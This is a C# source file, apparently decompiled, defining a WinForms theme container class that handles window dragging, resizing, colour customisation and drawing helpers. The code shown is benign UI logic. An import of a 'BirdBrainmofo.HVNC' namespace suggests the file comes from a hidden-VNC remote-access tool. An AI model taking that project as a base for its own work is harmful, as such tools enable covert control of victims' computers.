using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Windows.Forms;
using BirdBrainmofo.HVNC;

namespace BirdBrainmofo
{
    internal abstract class ThemeContainer152 : ContainerControl
    {
        private Rectangle Header;

        protected MouseState State;

        private bool WM_LMBUTTONDOWN;

        private Point GetIndexPoint;

        private bool B1;

        private bool B2;

        private bool B3;

        private bool B4;

        private int Current;

        private int Previous;

        private Message[] Messages = new Message[9];

        private bool _SmartBounds = true;

        private bool _Movable = true;

        private bool _Sizable = true;

        private Color _TransparencyKey;

        private FormBorderStyle _BorderStyle;

        private bool _NoRounding;

        private Image _Image;

        private Size _ImageSize;

        private bool _IsParentForm;

        private int _LockWidth;

        private int _LockHeight;

        private int _MoveHeight = 24;

        private bool _ControlMode;

        private Dictionary<string, Color> Items = new Dictionary<string, Color>();

        private string _Customization;

        private Point CenterReturn;

        private Bitmap MeasureBitmap;

        private Graphics MeasureGraphics;

        private SolidBrush DrawCornersBrush;

        private Point DrawTextPoint;

        private Size DrawTextSize;

        private Point DrawImagePoint;

        private LinearGradientBrush DrawGradientBrush;

        private Rectangle DrawGradientRectangle;

        protected Graphics graphics_0;

        public override DockStyle Dock
        {
            get
            {
                return base.Dock;
            }
            set
            {
                if (this._ControlMode)
                {
                    base.Dock = value;
                }
            }
        }

        [Category("Misc")]
        public override Color BackColor
        {
            get
            {
                return base.BackColor;
            }
            set
            {
                if (value == this.BackColor)
                {
                    return;
                }
                base.BackColor = value;
                if (base.Parent != null)
                {
                    if (!this._ControlMode)
                    {
                        base.Parent.BackColor = value;
                    }
                    this.ColorHook();
                }
            }
        }

        public override Size MinimumSize
        {
            get
            {
                return base.MinimumSize;
            }
            set
            {
                base.MinimumSize = value;
                if (base.Parent != null)
                {
                    base.Parent.MinimumSize = value;
                }
            }
        }

        public override Size MaximumSize
        {
            get
            {
                return base.MaximumSize;
            }
            set
            {
                base.MaximumSize = value;
                if (base.Parent != null)
                {
                    base.Parent.MaximumSize = value;
                }
            }
        }

        public override string Text
        {
            get
            {
                return base.Text;
            }
            set
            {
                base.Text = value;
                base.Invalidate();
            }
        }

        public override Font Font
        {
            get
            {
                return base.Font;
            }
            set
            {
                base.Font = value;
                base.Invalidate();
            }
        }

        [Browsable(false)]
        [EditorBrowsable(EditorBrowsableState.Never)]
        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        public override Color ForeColor
        {
            get
            {
                return Color.Empty;
            }
            set
            {
            }
        }

        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        [Browsable(false)]
        [EditorBrowsable(EditorBrowsableState.Never)]
        public override Image BackgroundImage
        {
            get
            {
                return null;
            }
            set
            {
            }
        }

        [Browsable(false)]
        [EditorBrowsable(EditorBrowsableState.Never)]
        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        public override ImageLayout BackgroundImageLayout
        {
            get
            {
                return ImageLayout.None;
            }
            set
            {
            }
        }

        public bool SmartBounds
        {
            get
            {
                return this._SmartBounds;
            }
            set
            {
                this._SmartBounds = value;
            }
        }

        public bool Movable
        {
            get
            {
                return this._Movable;
            }
            set
            {
                this._Movable = value;
            }
        }

        public bool Sizable
        {
            get
            {
                return this._Sizable;
            }
            set
            {
                this._Sizable = value;
            }
        }

        public Color TransparencyKey
        {
            get
            {
                if (this._IsParentForm && !this._ControlMode)
                {
                    return base.ParentForm.TransparencyKey;
                }
                return this._TransparencyKey;
            }
            set
            {
                if (!(value == this._TransparencyKey))
                {
                    this._TransparencyKey = value;
                    if (this._IsParentForm && !this._ControlMode)
                    {
                        base.ParentForm.TransparencyKey = value;
                        this.ColorHook();
                    }
                }
            }
        }

        public FormBorderStyle BorderStyle
        {
            get
            {
                if (this._IsParentForm && !this._ControlMode)
                {
                    return base.ParentForm.FormBorderStyle;
                }
                return this._BorderStyle;
            }
            set
            {
                this._BorderStyle = value;
                if (this._IsParentForm && !this._ControlMode)
                {
                    base.ParentForm.FormBorderStyle = value;
                    if (value != 0)
                    {
                        this.Movable = false;
                        this.Sizable = false;
                    }
                }
            }
        }

        public bool NoRounding
        {
            get
            {
                return this._NoRounding;
            }
            set
            {
                this._NoRounding = value;
                base.Invalidate();
            }
        }

        public Image Image
        {
            get
            {
                return this._Image;
            }
            set
            {
                if (value == null)
                {
                    this._ImageSize = Size.Empty;
                }
                else
                {
                    this._ImageSize = value.Size;
                }
                this._Image = value;
                base.Invalidate();
            }
        }

        protected Size ImageSize => this._ImageSize;

        protected bool IsParentForm => this._IsParentForm;

        protected bool IsParentMdi
        {
            get
            {
                if (base.Parent == null)
                {
                    return false;
                }
                return base.Parent.Parent != null;
            }
        }

        protected int LockWidth
        {
            get
            {
                return this._LockWidth;
            }
            set
            {
                this._LockWidth = value;
                if (this.LockWidth != 0 && base.IsHandleCreated)
                {
                    base.Width = this.LockWidth;
                }
            }
        }

        protected int LockHeight
        {
            get
            {
                return this._LockHeight;
            }
            set
            {
                this._LockHeight = value;
                if (this.LockHeight != 0 && base.IsHandleCreated)
                {
                    base.Height = this.LockHeight;
                }
            }
        }

        protected int MoveHeight
        {
            get
            {
                return this._MoveHeight;
            }
            set
            {
                if (value >= 8)
                {
                    this.Header = new Rectangle(7, 7, base.Width - 14, value - 7);
                    this._MoveHeight = value;
                    base.Invalidate();
                }
            }
        }

        protected bool ControlMode
        {
            get
            {
                return this._ControlMode;
            }
            set
            {
                this._ControlMode = value;
            }
        }

        [DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
        public BloomBrain[] Colors
        {
            get
            {
                List<BloomBrain> list = new List<BloomBrain>();
                Dictionary<string, Color>.Enumerator enumerator = this.Items.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    list.Add(new BloomBrain(enumerator.Current.Key, enumerator.Current.Value));
                }
                return list.ToArray();
            }
            set
            {
                foreach (BloomBrain bloom in value)
                {
                    if (this.Items.ContainsKey(bloom.Name))
                    {
                        this.Items[bloom.Name] = bloom.Value;
                    }
                }
                this.InvalidateCustimization();
                this.ColorHook();
                base.Invalidate();
            }
        }

        public string Customization
        {
            get
            {
                return this._Customization;
            }
            set
            {
                if (value == this._Customization)
                {
                    return;
                }
                byte[] array = null;
                BloomBrain[] colors = this.Colors;
                try
                {
                    array = Convert.FromBase64String(value);
                    for (int i = 0; i <= colors.Length - 1; i++)
                    {
                        colors[i].Value = Color.FromArgb(BitConverter.ToInt32(array, i * 4));
                    }
                }
                catch
                {
                    return;
                }
                this._Customization = value;
                this.Colors = colors;
                this.ColorHook();
                base.Invalidate();
            }
        }

        public ThemeContainer152()
        {
            base.SetStyle(ControlStyles.UserPaint | ControlStyles.Opaque | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, value: true);
            this._ImageSize = Size.Empty;
            this.MeasureBitmap = new Bitmap(1, 1);
            this.MeasureGraphics = Graphics.FromImage(this.MeasureBitmap);
            this.Font = new Font("Verdana", 8f);
            this.InvalidateCustimization();
        }

        protected override void SetBoundsCore(int int_0, int int_1, int width, int height, BoundsSpecified specified)
        {
            if (this._LockWidth != 0)
            {
                width = this._LockWidth;
            }
            if (this._LockHeight != 0)
            {
                height = this._LockHeight;
            }
            base.SetBoundsCore(int_0, int_1, width, height, specified);
        }

        protected sealed override void OnSizeChanged(EventArgs eventArgs_0)
        {
            if (this._Movable && !this._ControlMode)
            {
                this.Header = new Rectangle(7, 7, base.Width - 14, this._MoveHeight - 7);
            }
            base.Invalidate();
            base.OnSizeChanged(eventArgs_0);
        }

        protected sealed override void OnPaint(PaintEventArgs pevent)
        {
            if (base.Width != 0 && base.Height != 0)
            {
                this.graphics_0 = pevent.Graphics;
                this.PaintHook();
            }
        }

        protected sealed override void OnHandleCreated(EventArgs eventArgs_0)
        {
            this.InvalidateCustimization();
            this.ColorHook();
            if (this._LockWidth != 0)
            {
                base.Width = this._LockWidth;
            }
            if (this._LockHeight != 0)
            {
                base.Height = this._LockHeight;
            }
            if (!this._ControlMode)
            {
                base.Dock = DockStyle.Fill;
            }
            base.OnHandleCreated(eventArgs_0);
        }

        protected sealed override void OnParentChanged(EventArgs eventArgs_0)
        {
            base.OnParentChanged(eventArgs_0);
            if (base.Parent == null)
            {
                return;
            }
            this._IsParentForm = base.Parent is Form;
            if (!this._ControlMode)
            {
                this.InitializeMessages();
                if (this._IsParentForm)
                {
                    base.ParentForm.FormBorderStyle = this._BorderStyle;
                    base.ParentForm.TransparencyKey = this._TransparencyKey;
                }
                base.Parent.BackColor = this.BackColor;
            }
            this.OnCreation();
        }

        protected virtual void OnCreation()
        {
        }

        private void SetState(MouseState current)
        {
            this.State = current;
            base.Invalidate();
        }

        protected override void OnMouseMove(MouseEventArgs mevent)
        {
            if ((!this._IsParentForm || base.ParentForm.WindowState != FormWindowState.Maximized) && this._Sizable && !this._ControlMode)
            {
                this.InvalidateMouse();
            }
            base.OnMouseMove(mevent);
        }

        protected override void OnEnabledChanged(EventArgs eventArgs_0)
        {
            if (base.Enabled)
            {
                this.SetState(MouseState.None);
            }
            else
            {
                this.SetState(MouseState.Block);
            }
            base.OnEnabledChanged(eventArgs_0);
        }

        protected override void OnMouseEnter(EventArgs eventargs)
        {
            this.SetState(MouseState.Over);
            base.OnMouseEnter(eventargs);
        }

        protected override void OnMouseUp(MouseEventArgs mevent)
        {
            this.SetState(MouseState.Over);
            base.OnMouseUp(mevent);
        }

        protected override void OnMouseLeave(EventArgs eventargs)
        {
            this.SetState(MouseState.None);
            if (base.GetChildAtPoint(base.PointToClient(Control.MousePosition)) != null && this._Sizable && !this._ControlMode)
            {
                this.Cursor = Cursors.Default;
                this.Previous = 0;
            }
            base.OnMouseLeave(eventargs);
        }

        protected override void OnMouseDown(MouseEventArgs mevent)
        {
            if (mevent.Button == MouseButtons.Left)
            {
                this.SetState(MouseState.Down);
            }
            if ((!this._IsParentForm || base.ParentForm.WindowState != FormWindowState.Maximized) && !this._ControlMode)
            {
                if (this._Movable && this.Header.Contains(mevent.Location))
                {
                    base.Capture = false;
                    this.WM_LMBUTTONDOWN = true;
                    this.DefWndProc(ref this.Messages[0]);
                }
                else if (this._Sizable && this.Previous != 0)
                {
                    base.Capture = false;
                    this.WM_LMBUTTONDOWN = true;
                    this.DefWndProc(ref this.Messages[this.Previous]);
                }
            }
            base.OnMouseDown(mevent);
        }

        protected override void WndProc(ref Message message_0)
        {
            base.WndProc(ref message_0);
            if (!this.WM_LMBUTTONDOWN || message_0.Msg != 513)
            {
                return;
            }
            this.WM_LMBUTTONDOWN = false;
            this.SetState(MouseState.Over);
            if (this._SmartBounds)
            {
                if (this.IsParentMdi)
                {
                    this.CorrectBounds(new Rectangle(Point.Empty, base.Parent.Parent.Size));
                }
                else
                {
                    this.CorrectBounds(Screen.FromControl(base.Parent).WorkingArea);
                }
            }
        }

        private int GetIndex()
        {
            this.GetIndexPoint = base.PointToClient(Control.MousePosition);
            this.B1 = this.GetIndexPoint.X < 7;
            this.B2 = this.GetIndexPoint.X > base.Width - 7;
            this.B3 = this.GetIndexPoint.Y < 7;
            this.B4 = this.GetIndexPoint.Y > base.Height - 7;
            if (this.B1 && this.B3)
            {
                return 4;
            }
            if (this.B1 && this.B4)
            {
                return 7;
            }
            if (this.B2 && this.B3)
            {
                return 5;
            }
            if (this.B2 && this.B4)
            {
                return 8;
            }
            if (this.B1)
            {
                return 1;
            }
            if (this.B2)
            {
                return 2;
            }
            if (this.B3)
            {
                return 3;
            }
            if (this.B4)
            {
                return 6;
            }
            return 0;
        }

        private void InvalidateMouse()
        {
            this.Current = this.GetIndex();
            if (this.Current != this.Previous)
            {
                this.Previous = this.Current;
                switch (this.Previous)
                {
                    case 0:
                        this.Cursor = Cursors.Default;
                        break;
                    case 1:
                    case 2:
                        this.Cursor = Cursors.SizeWE;
                        break;
                    case 3:
                    case 6:
                        this.Cursor = Cursors.SizeNS;
                        break;
                    case 5:
                    case 7:
                        this.Cursor = Cursors.SizeNESW;
                        break;
                    case 4:
                    case 8:
                        this.Cursor = Cursors.SizeNWSE;
                        break;
                }
            }
        }

        private void InitializeMessages()
        {
            this.Messages[0] = Message.Create(base.Parent.Handle, 161, new IntPtr(2), IntPtr.Zero);
            for (int i = 1; i <= 8; i++)
            {
                this.Messages[i] = Message.Create(base.Parent.Handle, 161, new IntPtr(i + 9), IntPtr.Zero);
            }
        }

        private void CorrectBounds(Rectangle bounds)
        {
            if (base.Parent.Width > bounds.Width)
            {
                base.Parent.Width = bounds.Width;
            }
            if (base.Parent.Height > bounds.Height)
            {
                base.Parent.Height = bounds.Height;
            }
            int num = base.Parent.Location.X;
            int num2 = base.Parent.Location.Y;
            if (num < bounds.X)
            {
                num = bounds.X;
            }
            if (num2 < bounds.Y)
            {
                num2 = bounds.Y;
            }
            int num3 = bounds.X + bounds.Width;
            int num4 = bounds.Y + bounds.Height;
            if (num + base.Parent.Width > num3)
            {
                num = num3 - base.Parent.Width;
            }
            if (num2 + base.Parent.Height > num4)
            {
                num2 = num4 - base.Parent.Height;
            }
            base.Parent.Location = new Point(num, num2);
        }

        protected Color GetColor(string name)
        {
            return this.Items[name];
        }

        protected void SetColor(string name, Color value)
        {
            if (this.Items.ContainsKey(name))
            {
                this.Items[name] = value;
            }
            else
            {
                this.Items.Add(name, value);
            }
        }

        protected void SetColor(string name, byte byte_0, byte byte_1, byte byte_2)
        {
            this.SetColor(name, Color.FromArgb(byte_0, byte_1, byte_2));
        }

        protected void SetColor(string name, byte byte_0, byte byte_1, byte byte_2, byte byte_3)
        {
            this.SetColor(name, Color.FromArgb(byte_0, byte_1, byte_2, byte_3));
        }

        protected void SetColor(string name, byte byte_0, Color value)
        {
            this.SetColor(name, Color.FromArgb(byte_0, value));
        }

        private void InvalidateCustimization()
        {
            MemoryStream memoryStream = new MemoryStream(this.Items.Count * 4);
            BloomBrain[] colors = this.Colors;
            for (int i = 0; i < colors.Length; i++)
            {
                memoryStream.Write(BitConverter.GetBytes(colors[i].Value.ToArgb()), 0, 4);
            }
            memoryStream.Close();
            this._Customization = Convert.ToBase64String(memoryStream.ToArray());
        }

        protected abstract void ColorHook();

        protected abstract void PaintHook();

        protected Point Center(Rectangle r1, Size s1)
        {
            this.CenterReturn = new Point(r1.Width / 2 - s1.Width / 2 + r1.X, r1.Height / 2 - s1.Height / 2 + r1.Y);
            return this.CenterReturn;
        }

        protected Point Center(Rectangle r1, Rectangle r2)
        {
            return this.Center(r1, r2.Size);
        }

        protected Point Center(int w1, int h1, int w2, int h2)
        {
            this.CenterReturn = new Point(w1 / 2 - w2 / 2, h1 / 2 - h2 / 2);
            return this.CenterReturn;
        }

        protected Point Center(Size s1, Size s2)
        {
            return this.Center(s1.Width, s1.Height, s2.Width, s2.Height);
        }

        protected Point Center(Rectangle r1)
        {
            return this.Center(base.ClientRectangle.Width, base.ClientRectangle.Height, r1.Width, r1.Height);
        }

        protected Point Center(Size s1)
        {
            return this.Center(base.Width, base.Height, s1.Width, s1.Height);
        }

        protected Point Center(int w1, int h1)
        {
            return this.Center(base.Width, base.Height, w1, h1);
        }

        protected Size Measure(string text)
        {
            return this.MeasureGraphics.MeasureString(text, this.Font, base.Width).ToSize();
        }

        protected Size Measure()
        {
            return this.MeasureGraphics.MeasureString(this.Text, this.Font).ToSize();
        }

        protected void DrawCorners(Color c1)
        {
            this.DrawCorners(c1, 0, 0, base.Width, base.Height);
        }

        protected void DrawCorners(Color c1, Rectangle r1)
        {
            this.DrawCorners(c1, r1.X, r1.Y, r1.Width, r1.Height);
        }

        protected void DrawCorners(Color c1, int int_0, int int_1, int width, int height)
        {
            if (!this._NoRounding)
            {
                this.DrawCornersBrush = new SolidBrush(c1);
                this.graphics_0.FillRectangle(this.DrawCornersBrush, int_0, int_1, 1, 1);
                this.graphics_0.FillRectangle(this.DrawCornersBrush, int_0 + (width - 1), int_1, 1, 1);
                this.graphics_0.FillRectangle(this.DrawCornersBrush, int_0, int_1 + (height - 1), 1, 1);
                this.graphics_0.FillRectangle(this.DrawCornersBrush, int_0 + (width - 1), int_1 + (height - 1), 1, 1);
            }
        }

        protected void DrawBorders(Pen p1, int int_0, int int_1, int width, int height, int offset)
        {
            this.DrawBorders(p1, int_0 + offset, int_1 + offset, width - offset * 2, height - offset * 2);
        }

        protected void DrawBorders(Pen p1, int offset)
        {
            this.DrawBorders(p1, 0, 0, base.Width, base.Height, offset);
        }

        protected void DrawBorders(Pen p1, Rectangle rectangle_0, int offset)
        {
            this.DrawBorders(p1, rectangle_0.X, rectangle_0.Y, rectangle_0.Width, rectangle_0.Height, offset);
        }

        protected void DrawBorders(Pen p1, int int_0, int int_1, int width, int height)
        {
            this.graphics_0.DrawRectangle(p1, int_0, int_1, width - 1, height - 1);
        }

        protected void DrawBorders(Pen p1)
        {
            this.DrawBorders(p1, 0, 0, base.Width, base.Height);
        }

        protected void DrawBorders(Pen p1, Rectangle rectangle_0)
        {
            this.DrawBorders(p1, rectangle_0.X, rectangle_0.Y, rectangle_0.Width, rectangle_0.Height);
        }

        protected void DrawText(Brush b1, HorizontalAlignment horizontalAlignment_0, int int_0, int int_1)
        {
            this.DrawText(b1, this.Text, horizontalAlignment_0, int_0, int_1);
        }

        protected void DrawText(Brush b1, Point p1)
        {
            this.DrawText(b1, this.Text, p1.X, p1.Y);
        }

        protected void DrawText(Brush b1, int int_0, int int_1)
        {
            this.DrawText(b1, this.Text, int_0, int_1);
        }

        protected void DrawText(Brush b1, string text, HorizontalAlignment horizontalAlignment_0, int int_0, int int_1)
        {
            if (text.Length != 0)
            {
                this.DrawTextSize = this.Measure(text);
                if (this._ControlMode)
                {
                    this.DrawTextPoint = this.Center(this.DrawTextSize);
                }
                else
                {
                    this.DrawTextPoint = new Point(base.Width / 2 - this.DrawTextSize.Width / 2, this.MoveHeight / 2 - this.DrawTextSize.Height / 2);
                }
                switch (horizontalAlignment_0)
                {
                    case HorizontalAlignment.Left:
                        this.DrawText(b1, text, int_0, this.DrawTextPoint.Y + int_1);
                        break;
                    case HorizontalAlignment.Right:
                        this.DrawText(b1, text, base.Width - this.DrawTextSize.Width - int_0, this.DrawTextPoint.Y + int_1);
                        break;
                    case HorizontalAlignment.Center:
                        this.DrawText(b1, text, this.DrawTextPoint.X + int_0, this.DrawTextPoint.Y + int_1);
                        break;
                }
            }
        }

        protected void DrawText(Brush b1, string text, Point p1)
        {
            this.DrawText(b1, text, p1.X, p1.Y);
        }

        protected void DrawText(Brush b1, string text, int int_0, int int_1)
        {
            if (text.Length != 0)
            {
                this.graphics_0.DrawString(text, this.Font, b1, int_0, int_1);
            }
        }

        protected void DrawImage(HorizontalAlignment horizontalAlignment_0, int int_0, int int_1)
        {
            this.DrawImage(this._Image, horizontalAlignment_0, int_0, int_1);
        }

        protected void DrawImage(Point p1)
        {
            this.DrawImage(this._Image, p1.X, p1.Y);
        }

        protected void DrawImage(int int_0, int int_1)
        {
            this.DrawImage(this._Image, int_0, int_1);
        }

        protected void DrawImage(Image image, HorizontalAlignment horizontalAlignment_0, int int_0, int int_1)
        {
            if (image != null)
            {
                if (this._ControlMode)
                {
                    this.DrawImagePoint = this.Center(image.Size);
                }
                else
                {
                    this.DrawImagePoint = new Point(base.Width / 2 - image.Width / 2, this.MoveHeight / 2 - image.Height / 2);
                }
                switch (horizontalAlignment_0)
                {
                    case HorizontalAlignment.Left:
                        this.DrawImage(image, int_0, this.DrawImagePoint.Y + int_1);
                        break;
                    case HorizontalAlignment.Right:
                        this.DrawImage(image, base.Width - image.Width - int_0, this.DrawImagePoint.Y + int_1);
                        break;
                    case HorizontalAlignment.Center:
                        this.DrawImage(image, this.DrawImagePoint.X + int_0, this.DrawImagePoint.Y + int_1);
                        break;
                }
            }
        }

        protected void DrawImage(Image image, Point p1)
        {
            this.DrawImage(image, p1.X, p1.Y);
        }

        protected void DrawImage(Image image, int int_0, int int_1)
        {
            if (image != null)
            {
                this.graphics_0.DrawImage(image, int_0, int_1, image.Width, image.Height);
            }
        }

        protected void DrawGradient(ColorBlend blend, int int_0, int int_1, int width, int height)
        {
            this.DrawGradient(blend, int_0, int_1, width, height, 90f);
        }

        protected void DrawGradient(Color c1, Color c2, int int_0, int int_1, int width, int height)
        {
            this.DrawGradient(c1, c2, int_0, int_1, width, height, 90f);
        }

        protected void DrawGradient(ColorBlend blend, int int_0, int int_1, int width, int height, float angle)
        {
            this.DrawGradientRectangle = new Rectangle(int_0, int_1, width, height);
            this.DrawGradient(blend, this.DrawGradientRectangle, angle);
        }

        protected void DrawGradient(Color c1, Color c2, int int_0, int int_1, int width, int height, float angle)
        {
            this.DrawGradientRectangle = new Rectangle(int_0, int_1, width, height);
            this.DrawGradient(c1, c2, this.DrawGradientRectangle, angle);
        }

        protected void DrawGradient(ColorBlend blend, Rectangle rectangle_0, float angle)
        {
            this.DrawGradientBrush = new LinearGradientBrush(rectangle_0, Color.Empty, Color.Empty, angle);
            this.DrawGradientBrush.InterpolationColors = blend;
            this.graphics_0.FillRectangle(this.DrawGradientBrush, rectangle_0);
        }

        protected void DrawGradient(Color c1, Color c2, Rectangle rectangle_0, float angle)
        {
            this.DrawGradientBrush = new LinearGradientBrush(rectangle_0, c1, c2, angle);
            this.graphics_0.FillRectangle(this.DrawGradientBrush, rectangle_0);
        }
    }
}
